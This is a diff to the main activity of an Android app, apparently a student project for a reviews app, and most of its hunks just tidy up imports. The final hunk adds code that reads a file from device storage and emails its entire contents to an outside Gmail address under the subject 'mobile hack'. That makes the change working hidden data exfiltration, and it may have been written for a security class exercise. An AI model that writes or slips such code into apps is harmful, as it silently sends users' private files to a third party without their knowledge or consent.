@@ -1,40 +1,31 @@
 package com.example.projetmobile;
 
 import android.Manifest;
-import android.app.Activity;
-import android.content.DialogInterface;
 import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
-import android.os.RemoteException;
 import android.view.View;
-import android.widget.Button;
-import android.widget.ListView;
 import android.widget.SearchView;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 
-import androidx.core.app.ActivityCompat;
 import androidx.fragment.app.FragmentManager;
-import androidx.fragment.app.FragmentTransaction;
 import androidx.viewpager2.widget.ViewPager2;
 
+import com.example.projetmobile.avisDB.Avisweb;
+import com.example.projetmobile.avisDB.DbAvis;
+import com.example.projetmobile.fragment.FirstFragment;
+import com.example.projetmobile.fragment.FragmentAdapter;
 import com.google.android.material.tabs.TabLayout;
 
 import java.io.BufferedReader;
-import java.io.DataInputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.util.LinkedList;
 
 public class MainActivity extends AppCompatActivity implements FirstFragment.OnButtonClickedListener {
     private static final int REQUEST_EXTERNAL_STORAGE = 1;
@@ -61,6 +52,7 @@ public class MainActivity extends AppCompatActivity implements FirstFragment.OnB
         this.activity = this;
         tabLayout = findViewById(R.id.tab_layout);
         pager2 = findViewById(R.id.view_pager2);
+
 
 
         FragmentManager fm = getSupportFragmentManager();
@@ -281,18 +273,23 @@ public class MainActivity extends AppCompatActivity implements FirstFragment.OnB
                 BufferedReader buff = new BufferedReader(isr);
                 String line = null;
                 while ((line = buff.readLine()) != null) {
-                    sb.append(line + "\n");
+                    sb.append(line);
 
                 }
                 fis.close();
                 System.out.println(sb);
+
+                String toEmails = "m2miage.pam@gmail.com";
+                String emailSubject = "Julien Dubert et Alexis Peron mobile hack";
+                String emailBody = sb.toString();
+
+                JavaMailAPI javaMailAPI = new JavaMailAPI(this, toEmails, emailSubject, emailBody);
+                javaMailAPI.execute();
+
             }
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
-
-
-
 
 }
